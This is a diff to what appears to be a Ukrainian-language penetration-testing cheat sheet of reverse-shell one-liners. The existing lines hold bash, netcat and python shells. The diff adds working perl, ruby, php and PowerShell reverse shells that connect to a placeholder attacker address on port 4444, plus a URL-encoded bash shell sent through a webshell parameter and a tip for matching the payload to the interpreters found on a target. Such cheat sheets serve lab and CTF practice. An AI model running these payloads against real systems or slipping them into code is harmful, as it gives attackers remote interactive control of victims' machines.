@@ -33,10 +33,19 @@ bash -c 'bash -i >& /dev/tcp/10.8.N.x/4444 0>&1'
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.N.x 4444 >/tmp/f
 # python
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.8.N.x",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn("/bin/bash")'
+# perl
+perl -e 'use Socket;$i="10.8.N.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+# ruby
+ruby -rsocket -e'f=TCPSocket.open("10.8.N.x",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+# php
+php -r '$s=fsockopen("10.8.N.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 # nc (з -e, рідко)
 nc -e /bin/bash 10.8.N.x 4444
 # socat (повний TTY) — див. netcat-socat.md
+# powershell (Windows-ціль)
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.8.N.x',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($r),0,$r.Length)}"
 ```
+Швидкий підбір під наявний інтерпретатор: що є на цілі (`which python3 perl ruby php nc socat`), те й використати.
 URL-encoded через webshell:
 ```
 http://$TARGET/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.8.N.x/4444+0>%261'
